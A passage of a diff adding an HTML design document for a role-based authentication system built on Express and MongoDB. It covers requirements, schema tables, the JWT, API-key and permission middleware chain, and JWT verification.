@@ -1,0 +1,1141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Auth System — BRD, System Design & Developer Guide</title>
+<style>
+  /* ── Reset & Base ─────────────────────────────────────────────── */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { font-size: 13px; }
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: #1a1a2e;
+    background: #fff;
+    line-height: 1.7;
+  }
+
+  /* ── Print ────────────────────────────────────────────────────── */
+  @media print {
+    body { font-size: 11px; }
+    .page { page-break-after: always; padding: 18mm 18mm 22mm; }
+    .page:last-child { page-break-after: avoid; }
+    .no-print { display: none; }
+    .page-footer { position: fixed; bottom: 10mm; left: 0; right: 0; text-align: center; font-size: 9px; color: #999; }
+    pre, code { font-size: 9px; }
+    a { color: inherit; text-decoration: none; }
+  }
+
+  /* ── Page Layout ──────────────────────────────────────────────── */
+  .page {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 48px 60px;
+    min-height: 100vh;
+    border-bottom: 2px dashed #e0e0e0;
+    position: relative;
+  }
+  .page:last-child { border-bottom: none; }
+
+  /* ── Header / Footer ──────────────────────────────────────────── */
+  .page-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 3px solid #0f3460;
+    padding-bottom: 8px;
+    margin-bottom: 28px;
+    font-size: 10px;
+    color: #666;
+    letter-spacing: .5px;
+  }
+  .page-footer {
+    margin-top: 40px;
+    padding-top: 10px;
+    border-top: 1px solid #ddd;
+    font-size: 10px;
+    color: #888;
+    text-align: center;
+    letter-spacing: .3px;
+  }
+
+  /* ── Cover Page ───────────────────────────────────────────────── */
+  .cover {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #0f3460 0%, #16213e 60%, #0a0a23 100%);
+    color: #fff;
+    padding: 60px 48px;
+    border-bottom: none;
+  }
+  .cover-badge {
+    background: #e94560;
+    color: #fff;
+    padding: 4px 16px;
+    border-radius: 20px;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 24px;
+  }
+  .cover h1 { font-size: 2.4rem; font-weight: 800; line-height: 1.2; margin-bottom: 12px; }
+  .cover h2 { font-size: 1.1rem; font-weight: 300; opacity: .8; margin-bottom: 40px; }
+  .cover-divider { width: 60px; height: 3px; background: #e94560; margin: 0 auto 40px; }
+  .cover-meta { font-size: 12px; opacity: .7; line-height: 2; }
+  .cover-meta strong { color: #fff; opacity: 1; }
+
+  /* ── Typography ───────────────────────────────────────────────── */
+  h1 { font-size: 1.9rem; color: #0f3460; margin-bottom: 18px; }
+  h2 { font-size: 1.4rem; color: #0f3460; margin: 32px 0 12px; border-left: 4px solid #e94560; padding-left: 12px; }
+  h3 { font-size: 1.1rem; color: #16213e; margin: 22px 0 8px; }
+  h4 { font-size: .95rem; color: #e94560; margin: 16px 0 6px; text-transform: uppercase; letter-spacing: .5px; }
+  p  { margin-bottom: 10px; }
+  ul, ol { padding-left: 22px; margin-bottom: 10px; }
+  li { margin-bottom: 4px; }
+  strong { color: #0f3460; }
+
+  /* ── TOC ──────────────────────────────────────────────────────── */
+  .toc-item { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px dotted #ccc; font-size: 12.5px; }
+  .toc-item.l2 { padding-left: 20px; font-size: 12px; color: #555; }
+  .toc-section { font-weight: 700; color: #0f3460; }
+
+  /* ── Callout Boxes ────────────────────────────────────────────── */
+  .callout { border-left: 4px solid; padding: 12px 16px; margin: 16px 0; border-radius: 0 6px 6px 0; font-size: 12.5px; }
+  .callout.info  { border-color: #0f3460; background: #eef2f8; }
+  .callout.warn  { border-color: #e94560; background: #fff0f2; }
+  .callout.tip   { border-color: #27ae60; background: #f0fff4; }
+  .callout.danger{ border-color: #c0392b; background: #fff5f5; }
+  .callout-title { font-weight: 700; margin-bottom: 4px; font-size: 11px; text-transform: uppercase; letter-spacing: .5px; }
+  .callout.info  .callout-title { color: #0f3460; }
+  .callout.warn  .callout-title { color: #e94560; }
+  .callout.tip   .callout-title { color: #27ae60; }
+  .callout.danger .callout-title { color: #c0392b; }
+
+  /* ── Code ─────────────────────────────────────────────────────── */
+  pre {
+    background: #0d1117;
+    color: #c9d1d9;
+    padding: 16px 20px;
+    border-radius: 8px;
+    font-family: 'Courier New', monospace;
+    font-size: 11.5px;
+    overflow-x: auto;
+    margin: 14px 0;
+    line-height: 1.6;
+  }
+  code { background: #f3f4f6; color: #e94560; padding: 1px 5px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 11px; }
+  .comment { color: #8b949e; }
+  .keyword { color: #ff7b72; }
+  .string  { color: #a5d6ff; }
+  .fn      { color: #d2a8ff; }
+  .prop    { color: #79c0ff; }
+
+  /* ── Tables ───────────────────────────────────────────────────── */
+  table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 12px; }
+  th { background: #0f3460; color: #fff; padding: 8px 12px; text-align: left; font-size: 11px; letter-spacing: .3px; }
+  td { padding: 7px 12px; border-bottom: 1px solid #e8e8e8; vertical-align: top; }
+  tr:nth-child(even) td { background: #f9f9fc; }
+
+  /* ── Badges ───────────────────────────────────────────────────── */
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 700; letter-spacing: .3px; }
+  .badge.green  { background: #d4edda; color: #155724; }
+  .badge.red    { background: #f8d7da; color: #721c24; }
+  .badge.blue   { background: #cce5ff; color: #004085; }
+  .badge.orange { background: #fff3cd; color: #856404; }
+
+  /* ── Flow Diagrams ────────────────────────────────────────────── */
+  .flow { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin: 16px 0; }
+  .flow-box {
+    background: #0f3460; color: #fff; padding: 7px 14px;
+    border-radius: 6px; font-size: 11.5px; font-weight: 600;
+    white-space: nowrap;
+  }
+  .flow-box.red  { background: #e94560; }
+  .flow-box.green{ background: #27ae60; }
+  .flow-box.gray { background: #666; }
+  .flow-arrow { font-size: 18px; color: #aaa; font-weight: 300; }
+
+  /* ── Layer Cards ──────────────────────────────────────────────── */
+  .layer-stack { margin: 16px 0; }
+  .layer-card {
+    display: flex; align-items: stretch;
+    border: 1px solid #ddd; border-radius: 8px;
+    overflow: hidden; margin-bottom: 8px;
+  }
+  .layer-label {
+    background: #0f3460; color: #fff;
+    padding: 10px 14px; min-width: 140px;
+    font-size: 11px; font-weight: 700;
+    display: flex; align-items: center;
+    letter-spacing: .3px;
+  }
+  .layer-desc { padding: 10px 16px; font-size: 12px; flex: 1; }
+  .layer-desc code { font-size: 10.5px; }
+
+  /* ── Schema Table ─────────────────────────────────────────────── */
+  .schema-name {
+    background: #16213e; color: #fff;
+    padding: 6px 14px; font-size: 12px;
+    font-weight: 700; letter-spacing: .5px;
+    border-radius: 6px 6px 0 0; display: inline-block;
+    margin-bottom: -1px;
+  }
+
+  /* ── Print Button ─────────────────────────────────────────────── */
+  .print-btn {
+    position: fixed; bottom: 30px; right: 30px; z-index: 999;
+    background: #0f3460; color: #fff; border: none;
+    padding: 12px 24px; border-radius: 30px;
+    font-size: 14px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,.25);
+  }
+  .print-btn:hover { background: #e94560; }
+</style>
+</head>
+<body>
+
+<button class="print-btn no-print" onclick="window.print()">🖨 Print / Save as PDF</button>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 1: COVER -->
+<div class="page cover">
+  <div class="cover-badge">Confidential · Internal Documentation</div>
+  <h1>Auth System<br/>BRD &amp; System Design</h1>
+  <h2>Role-Based Access Control · JWT · API Key Management<br/>Cookie Security · Frontend Integration Guide</h2>
+  <div class="cover-divider"></div>
+  <div class="cover-meta">
+    <strong>Project:</strong> Backend API — Node.js + Express.js + TypeScript<br/>
+    <strong>Author:</strong> Nikhil Mahato (Software Development Engineer 1)<br/>
+    <strong>Version:</strong> 2.0 &nbsp;|&nbsp; <strong>Date:</strong> May 2026<br/>
+    <strong>Status:</strong> Active Development
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 2: TOC -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Table of Contents</span></div>
+
+  <h1>Table of Contents</h1>
+
+  <div class="toc-item"><span class="toc-section">1. Business Requirements Document (BRD)</span><span>3</span></div>
+  <div class="toc-item l2"><span>1.1 Project Overview</span><span>3</span></div>
+  <div class="toc-item l2"><span>1.2 Business Objectives</span><span>3</span></div>
+  <div class="toc-item l2"><span>1.3 Stakeholders</span><span>3</span></div>
+  <div class="toc-item l2"><span>1.4 Functional Requirements</span><span>3</span></div>
+  <div class="toc-item l2"><span>1.5 Non-Functional Requirements</span><span>4</span></div>
+  <div class="toc-item l2"><span>1.6 Assumptions &amp; Constraints</span><span>4</span></div>
+
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">2. System Design</span><span>5</span></div>
+  <div class="toc-item l2"><span>2.1 High-Level Architecture</span><span>5</span></div>
+  <div class="toc-item l2"><span>2.2 Clean Architecture Layers</span><span>5</span></div>
+  <div class="toc-item l2"><span>2.3 Database Schema Design</span><span>6</span></div>
+  <div class="toc-item l2"><span>2.4 Security Architecture — 3-Layer Chain</span><span>7</span></div>
+
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">3. JWT Authentication — Deep Dive</span><span>8</span></div>
+  <div class="toc-item l2"><span>3.1 What is a JWT?</span><span>8</span></div>
+  <div class="toc-item l2"><span>3.2 Login Flow (Step by Step)</span><span>8</span></div>
+  <div class="toc-item l2"><span>3.3 Two-Step JWT Middleware</span><span>9</span></div>
+
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">4. API Key System</span><span>10</span></div>
+  <div class="toc-item l2"><span>4.1 Why API Keys + JWT Together?</span><span>10</span></div>
+  <div class="toc-item l2"><span>4.2 Bootstrap Flow (First Key)</span><span>10</span></div>
+  <div class="toc-item l2"><span>4.3 Usage Limit &amp; Expiry</span><span>10</span></div>
+
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">5. RBAC — Role-Based Access Control</span><span>11</span></div>
+  <div class="toc-item l2"><span>5.1 Concept Explained</span><span>11</span></div>
+  <div class="toc-item l2"><span>5.2 Permission Middleware — 3 Gates</span><span>11</span></div>
+  <div class="toc-item l2"><span>5.3 Module Access Matrix</span><span>12</span></div>
+
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">6. Frontend Integration Guide</span><span>13</span></div>
+  <div class="toc-item l2"><span>6.1 Login Flow from Frontend</span><span>13</span></div>
+  <div class="toc-item l2"><span>6.2 JWT Storage — Cookies vs Redux/localStorage</span><span>13</span></div>
+  <div class="toc-item l2"><span>6.3 Cookie Security Flags Explained</span><span>14</span></div>
+  <div class="toc-item l2"><span>6.4 Cookie Stealing &amp; Session Hijacking — Prevention</span><span>15</span></div>
+  <div class="toc-item l2"><span>6.5 Protected Routes in React</span><span>16</span></div>
+
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">7. Security Best Practices</span><span>17</span></div>
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">8. API Endpoint Reference</span><span>18</span></div>
+  <div class="toc-item" style="margin-top:8px"><span class="toc-section">9. Folder Structure &amp; Developer Guide</span><span>19</span></div>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 3: BRD -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 1 · Business Requirements Document</span></div>
+  <h1>1. Business Requirements Document (BRD)</h1>
+
+  <h2>1.1 Project Overview</h2>
+  <p>This document describes the design, requirements, and implementation of a <strong>Role-Based Authentication and Authorization System</strong> built on Node.js + Express.js + TypeScript, following Clean Layer Architecture. The system governs who can log in, which modules they can access, and what actions they can perform — enforced at every API endpoint.</p>
+
+  <h2>1.2 Business Objectives</h2>
+  <ul>
+    <li><strong>Secure API Access:</strong> Every API call must be authenticated with both a valid JWT token and a valid API key. Neither alone is sufficient.</li>
+    <li><strong>Fine-Grained Permissions:</strong> Each user's role defines exactly which modules they can access and which actions (create, edit, view, delete, transfer, export) they can perform.</li>
+    <li><strong>User Lifecycle Management:</strong> Admins can deactivate user accounts; deactivated users lose access immediately on the next request — no waiting for token expiry.</li>
+    <li><strong>API Key Lifecycle:</strong> API keys have a usage limit and an expiry date. Keys stop working automatically when either limit is hit.</li>
+    <li><strong>Audit-Ready:</strong> Every entity tracks <code>createdAt</code>, <code>updatedAt</code>, and <code>created_by</code> for audit trails.</li>
+    <li><strong>Zero Hardcoded Permissions:</strong> Permissions live in the database and can be changed in real time by an admin — no redeploy needed.</li>
+  </ul>
+
+  <h2>1.3 Stakeholders</h2>
+  <table>
+    <tr><th>Stakeholder</th><th>Role</th><th>Concern</th></tr>
+    <tr><td>Super Admin</td><td>Creates modules, roles, and users</td><td>Full system access, bootstraps the system</td></tr>
+    <tr><td>Role Manager</td><td>Assigns permissions to roles</td><td>Can change who accesses what</td></tr>
+    <tr><td>Regular User</td><td>Uses the application</td><td>Can only do what their role allows</td></tr>
+    <tr><td>Frontend Dev</td><td>Builds the UI</td><td>Needs to store JWT securely, handle 401/403 responses</td></tr>
+    <tr><td>API Consumer</td><td>External/internal service using API keys</td><td>Needs a valid API key + JWT to call any endpoint</td></tr>
+  </table>
+
+  <h2>1.4 Functional Requirements</h2>
+  <table>
+    <tr><th>ID</th><th>Requirement</th><th>Priority</th></tr>
+    <tr><td>FR-01</td><td>Users must login with email + password to receive a JWT token</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-02</td><td>Inactive users must NOT be able to login</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-03</td><td>All protected endpoints require a valid JWT + valid API key</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-04</td><td>Deactivating a user must stop their access on the very next API call</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-05</td><td>Roles define module-level access with 6 boolean actions per module</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-06</td><td>API keys must have an expiry date and usage limit</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-07</td><td>The first API key must be creatable using a bootstrap secret from .env</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-08</td><td>Passwords must be hashed with bcrypt (salt rounds = 12)</td><td><span class="badge red">High</span></td></tr>
+    <tr><td>FR-09</td><td>Module slugs (module_id) must be lowercase with underscores only</td><td><span class="badge blue">Medium</span></td></tr>
+    <tr><td>FR-10</td><td>A seed script must create the super admin user and print a JWT token</td><td><span class="badge blue">Medium</span></td></tr>
+    <tr><td>FR-11</td><td>Swagger UI must show all endpoints with security schemes documented</td><td><span class="badge blue">Medium</span></td></tr>
+    <tr><td>FR-12</td><td>API key accepted from header OR request body field</td><td><span class="badge orange">Low</span></td></tr>
+  </table>
+
+  <h2>1.5 Non-Functional Requirements</h2>
+  <table>
+    <tr><th>Category</th><th>Requirement</th></tr>
+    <tr><td><strong>Performance</strong></td><td>Auth middleware DB lookup must use <code>.select('is_active')</code> to fetch only the needed field — minimal overhead per request</td></tr>
+    <tr><td><strong>Security</strong></td><td>JWT secret must be a long random string in production. Never commit .env to git.</td></tr>
+    <tr><td><strong>Maintainability</strong></td><td>Clean architecture — no business logic in controllers, no DB calls outside repositories</td></tr>
+    <tr><td><strong>Scalability</strong></td><td>Permission data read from DB on each request — supports real-time role changes with no cache invalidation needed</td></tr>
+    <tr><td><strong>Code Quality</strong></td><td>SonarQube compliant — cognitive complexity &lt; 15 per function, no magic strings</td></tr>
+    <tr><td><strong>TypeScript</strong></td><td><code>npx tsc --noEmit</code> must pass with zero errors in CI</td></tr>
+  </table>
+
+  <h2>1.6 Assumptions &amp; Constraints</h2>
+  <ul>
+    <li>The system uses MongoDB Atlas (cloud-hosted). Mongoose is the ODM.</li>
+    <li>JWT uses HS256 algorithm. RS256 (asymmetric) is recommended for multi-service setups but not in scope.</li>
+    <li>OTP / 2FA is a future feature — not in current scope.</li>
+    <li>Password reset flow is a future feature — not in current scope.</li>
+    <li>All timestamps are UTC (MongoDB default).</li>
+    <li>The <code>FOR_API_KEY_CREATE_KEY</code> bootstrap key must be rotated after the first API key is created in production.</li>
+  </ul>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 4: SYSTEM DESIGN -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 2 · System Design</span></div>
+  <h1>2. System Design</h1>
+
+  <h2>2.1 High-Level Architecture</h2>
+  <p>The system follows the <strong>Clean Layer Architecture</strong> pattern, which mirrors the NestJS module structure but in plain Express.js. Every incoming HTTP request passes through a layered pipeline:</p>
+
+  <div class="flow">
+    <div class="flow-box">Client (Browser / Mobile / Postman)</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Express Router</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">Auth Middleware<br/><small style="font-weight:300">JWT verify + DB active check</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">API Key Middleware<br/><small style="font-weight:300">DB key + expiry + usage</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">Permission Middleware<br/><small style="font-weight:300">RBAC 3-gate check</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Controller</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Use-Case</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Repository</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box green">MongoDB</div>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-title">Why this flow matters</div>
+    If any middleware rejects the request (401 or 403), the chain stops immediately and the controller never runs. Business logic is never executed for unauthorized requests.
+  </div>
+
+  <h2>2.2 Clean Architecture Layers</h2>
+  <div class="layer-stack">
+    <div class="layer-card">
+      <div class="layer-label">Routes Layer<br/><small>src/routes/</small></div>
+      <div class="layer-desc">Declares HTTP method + path + middleware chain. <strong>No logic here.</strong> Just wires the URL to middleware + controller. Example: <code>router.get('/:id', authMiddleware, apiKeyMiddleware, requirePermission('user_management','view'), getUserById)</code></div>
+    </div>
+    <div class="layer-card">
+      <div class="layer-label">Middleware Layer<br/><small>src/middlewares/</small></div>
+      <div class="layer-desc">Cross-cutting security concerns: JWT verification, API key validation, RBAC permission check. Each middleware does ONE thing, runs in sequence, calls <code>next()</code> to pass or <code>res.status(4xx)</code> to block.</div>
+    </div>
+    <div class="layer-card">
+      <div class="layer-label">Controller Layer<br/><small>src/controllers/</small></div>
+      <div class="layer-desc">Parses the HTTP request (body, params, query), validates with Joi schema, calls the use-case, and returns a formatted JSON response. <strong>Zero business logic.</strong></div>
+    </div>
+    <div class="layer-card">
+      <div class="layer-label">Use-Case Layer<br/><small>src/use-cases/</small></div>
+      <div class="layer-desc">Contains ALL business logic. Checks duplicates, hashes passwords, builds aggregation pipelines, computes grades, etc. Uses <code>IDataServices</code> interface — never imports Mongoose directly.</div>
+    </div>
+    <div class="layer-card">
+      <div class="layer-label">Repository Layer<br/><small>src/frameworks/mongo/</small></div>
+      <div class="layer-desc"><code>MongoGenericRepository&lt;T&gt;</code> implements <code>IGenericRepository&lt;T&gt;</code>. All DB operations live here. Use-cases depend on the interface, not the concrete class — easy to swap to a different DB.</div>
+    </div>
+    <div class="layer-card">
+      <div class="layer-label">Core / Domain Layer<br/><small>src/core/</small></div>
+      <div class="layer-desc"><strong>Zero dependencies on Express or Mongoose.</strong> Contains: <code>entities/</code> (TypeScript interfaces), <code>dtos/</code> (Joi validation schemas), <code>abstracts/</code> (IDataServices, IGenericRepository interfaces). This layer defines the shape of data.</div>
+    </div>
+  </div>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 5: SCHEMA DESIGN -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 2.3 · Database Schema Design</span></div>
+  <h2>2.3 Database Schema Design</h2>
+  <p>All collections live in the <code>student_db</code> MongoDB database. MongoDB uses documents (JSON), not tables, but we design them like relational schemas for clarity.</p>
+
+  <div class="schema-name">Collection: users</div>
+  <table>
+    <tr><th>Field</th><th>Type</th><th>Required</th><th>Notes</th></tr>
+    <tr><td><code>_id</code></td><td>ObjectId</td><td>Auto</td><td>MongoDB primary key</td></tr>
+    <tr><td><code>username</code></td><td>String</td><td>Yes</td><td>Display name, 2–50 chars</td></tr>
+    <tr><td><code>email</code></td><td>String</td><td>Yes</td><td>Unique, lowercase. Used for login</td></tr>
+    <tr><td><code>mobile_no</code></td><td>String</td><td>Yes</td><td>Phone number with country code</td></tr>
+    <tr><td><code>password</code></td><td>String</td><td>Yes</td><td>bcrypt hash (salt rounds=12). Never stored plain</td></tr>
+    <tr><td><code>role_id</code></td><td>ObjectId → roles</td><td>Yes</td><td>FK reference to roles collection</td></tr>
+    <tr><td><code>is_active</code></td><td>Boolean</td><td>Default: true</td><td><strong>Soft deactivation.</strong> false = cannot login, all requests blocked immediately</td></tr>
+    <tr><td><code>createdAt</code></td><td>Date</td><td>Auto</td><td>Set by Mongoose timestamps:true</td></tr>
+    <tr><td><code>updatedAt</code></td><td>Date</td><td>Auto</td><td>Set by Mongoose timestamps:true</td></tr>
+  </table>
+
+  <div class="schema-name" style="margin-top:18px">Collection: roles</div>
+  <table>
+    <tr><th>Field</th><th>Type</th><th>Notes</th></tr>
+    <tr><td><code>role_name</code></td><td>String (unique)</td><td>e.g. "super_admin", "editor", "viewer"</td></tr>
+    <tr><td><code>role_access</code></td><td>Array of ModuleAccess</td><td>Each entry: <code>{ module_id, create, edit, view, delete, transfer, export }</code></td></tr>
+    <tr><td><code>is_active</code></td><td>Boolean</td><td>Inactive role = all users with this role are blocked</td></tr>
+  </table>
+
+  <div class="schema-name" style="margin-top:18px">Collection: modules</div>
+  <table>
+    <tr><th>Field</th><th>Type</th><th>Notes</th></tr>
+    <tr><td><code>module_id</code></td><td>String (unique slug)</td><td>Lowercase + underscores only. e.g. <code>user_management</code></td></tr>
+    <tr><td><code>module_name</code></td><td>String</td><td>Human-readable. e.g. "User Management"</td></tr>
+    <tr><td><code>is_active</code></td><td>Boolean</td><td>Inactive modules cannot be assigned to roles</td></tr>
+  </table>
+
+  <div class="schema-name" style="margin-top:18px">Collection: apikeys</div>
+  <table>
+    <tr><th>Field</th><th>Type</th><th>Notes</th></tr>
+    <tr><td><code>name</code></td><td>String</td><td>Label e.g. "Production Key", "Staging Key"</td></tr>
+    <tr><td><code>key</code></td><td>String (unique)</td><td>64-char random hex. Shown ONLY at creation time. Cannot be retrieved later.</td></tr>
+    <tr><td><code>is_active</code></td><td>Boolean</td><td>Can be toggled to revoke access instantly</td></tr>
+    <tr><td><code>usage_limit</code></td><td>Number</td><td>Max requests allowed. <code>-1</code> = unlimited</td></tr>
+    <tr><td><code>usage_count</code></td><td>Number</td><td>Auto-incremented on each valid request. When ≥ usage_limit → key stops working</td></tr>
+    <tr><td><code>expires_at</code></td><td>Date</td><td>After this date → key is automatically rejected</td></tr>
+    <tr><td><code>created_by</code></td><td>ObjectId → users</td><td>Who created this key. Each user manages their own keys.</td></tr>
+  </table>
+
+  <h2>2.4 Security Architecture — 3-Layer Chain</h2>
+  <p>Every protected route passes through three middleware layers in sequence. Failure at any gate stops the request immediately.</p>
+
+  <table>
+    <tr><th>Layer</th><th>Middleware</th><th>What it checks</th><th>On failure</th></tr>
+    <tr>
+      <td><strong>Layer 1</strong></td>
+      <td><code>authMiddleware</code></td>
+      <td>1. JWT signature valid?<br/>2. Token not expired?<br/>3. User exists &amp; <code>is_active: true</code> in DB?</td>
+      <td>401 Unauthorized</td>
+    </tr>
+    <tr>
+      <td><strong>Layer 2</strong></td>
+      <td><code>apiKeyMiddleware</code></td>
+      <td>1. API key present (header or body)?<br/>2. Key exists in DB?<br/>3. Key <code>is_active: true</code>?<br/>4. <code>expires_at</code> in future?<br/>5. <code>usage_count &lt; usage_limit</code>?</td>
+      <td>401 Unauthorized<br/>or 429 Limit exceeded</td>
+    </tr>
+    <tr>
+      <td><strong>Layer 3</strong></td>
+      <td><code>requirePermission(moduleId, action)</code></td>
+      <td>1. Role exists &amp; <code>is_active: true</code>?<br/>2. Module in <code>role_access[]</code>?<br/>3. Specific action = <code>true</code>?</td>
+      <td>403 Forbidden</td>
+    </tr>
+  </table>
+
+  <div class="callout tip">
+    <div class="callout-title">Design principle</div>
+    401 = "I don't know who you are" (authentication failed). 403 = "I know who you are but you are not allowed" (authorization failed). Never mix these two status codes.
+  </div>
+
+  <div class="page-footer">Made by Nikhil Mahato (Software Development Engineer 1)</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ PAGE 6: JWT DEEP DIVE -->
+<div class="page">
+  <div class="page-header"><span>Auth System — BRD &amp; System Design</span><span>Section 3 · JWT Authentication</span></div>
+  <h1>3. JWT Authentication — Deep Dive</h1>
+
+  <h2>3.1 What is a JWT?</h2>
+  <p>JWT stands for <strong>JSON Web Token</strong>. It is a compact, URL-safe string that proves the caller's identity without hitting the database on every request. A JWT has three parts separated by dots:</p>
+
+  <pre><span class="string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span class="prop">eyJ1c2VyX2lkIjoiNjY0ZiIsImVtYWlsIjoiYWRtaW5AZXhhbXBsZS5jb20ifQ</span>.<span class="fn">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+
+<span class="comment">│ Part 1: Header     │ Encoded JSON: { "alg": "HS256", "typ": "JWT" }
+│ Part 2: Payload    │ Encoded JSON: { user_id, email, role_id, exp, iat }
+│ Part 3: Signature  │ HMAC-SHA256( header + "." + payload, JWT_SECRET )</span></pre>
+
+  <div class="callout warn">
+    <div class="callout-title">Important security fact</div>
+    The payload is only <strong>Base64-encoded, NOT encrypted.</strong> Anyone can decode it and read the user_id, email, and role_id. <strong>Never put sensitive data (passwords, credit cards) in the JWT payload.</strong> The signature only proves the token was created by the server — it does not hide the content.
+  </div>
+
+  <h2>3.2 Login Flow (Step by Step)</h2>
+  <div class="flow">
+    <div class="flow-box">POST /auth/login<br/><small>{ email, password }</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Find user by email</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">is_active check</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box red">bcrypt.compare<br/><small>password</small></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box green">jwt.sign(payload,<br/>secret, {expiresIn})</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-box">Return { token, user }</div>
+  </div>
+
+  <h3>What gets signed into the JWT payload?</h3>
+<pre>{
+  <span class="prop">"user_id"</span>: <span class="string">"664f1a2b3c4d5e6f7a8b9c0d"</span>,  <span class="comment">// MongoDB _id of the user</span>
+  <span class="prop">"email"</span>:   <span class="string">"admin@example.com"</span>,
+  <span class="prop">"role_id"</span>: <span class="string">"664f1a2b3c4d5e6f7a8b9c0e"</span>,  <span class="comment">// used by permission middleware</span>
+  <span class="prop">"iat"</span>:     <span class="string">1716912000</span>,               <span class="comment">// issued at (Unix timestamp)</span>
+  <span class="prop">"exp"</span>:     <span class="string">1717516800</span>                <span class="comment">// expires at (iat + 7 days)</span>
+}</pre>
+
+  <h2>3.3 Two-Step JWT Middleware</h2>
+  <p>When a request arrives at a protected endpoint, <code>authMiddleware</code> runs two checks:</p>
+
+  <h4>Step 1 — Stateless JWT verification (no DB)</h4>
+  <pre><span class="keyword">const</span> <span class="prop">decoded</span> = <span class="fn">jwt.verify</span>(token, secret);
+<span class="comment">// Throws TokenExpiredError if exp &lt; now
+// Throws JsonWebTokenError if signature is wrong or token is malformed</span></pre>
+  <p>This is fast — it only does cryptographic math, no DB call.</p>
+
+  <h4>Step 2 — Live DB check for is_active</h4>
+<pre><span class="keyword">const</span> <span class="prop">user</span> = <span class="keyword">await</span> User.<span class="fn">findById</span>(decoded.user_id).<span class="fn">select</span>(<span class="string">'is_active'</span>);
+<span class="keyword">if</span> (!user.is_active) <span class="keyword">return</span> <span class="fn">res.status</span>(<span class="string">401</span>).json({ message: <span class="string">'Account deactivated'</span> });</pre>
+
+  <div class="callout info">
+    <div class="callout-title">Why do we need Step 2?</div>
+    <p>A JWT is valid until it expires (e.g. 7 days). If you only do Step 1, an admin deactivating a user in the database has NO effect for up to 7 days — the user still has a valid token. By adding a DB lookup in Step 2, deactivation takes effect on the very <strong>next request</strong> the user makes. This is the industry standard for systems where real-time access revocation matters.</p>
+    <p>We use <code>.select('is_active')</code> to only fetch that one field — keeping the query as lightweight as possible.</p>
+  </div>
+
+  <h3>Token Expiry Strategy</h3>
+  <table>
+    <tr><th>Environment</th><th>Recommended Expiry</th><th>Reason</th></tr>
+    <tr><td>Development</td><td>7d</td><td>Convenient, fewer re-logins</td></tr>
+    <tr><td>Production (low security)</td><td>24h</td><td>Balance of UX and security</td></tr>
+    <tr><td>Production (high security)</td><td>15min + refresh token</td><td>Short-lived access tokens with silent refresh</td></tr>
+    <tr><td>Internal tools</td><td>30d</td><td>Low risk, infrequent users</td></tr>
+  </table>
+
+  <div class="callout tip">
+    <div class="callout-title">Future enhancement</div>
+    This system currently uses simple expiry. A future enhancement would add a <strong>Refresh Token</strong> — a long-lived (30d) token stored in an HttpOnly cookie that silently obtains a new short-lived (15min) access token. This gives both security and good UX.
+  </div>
+
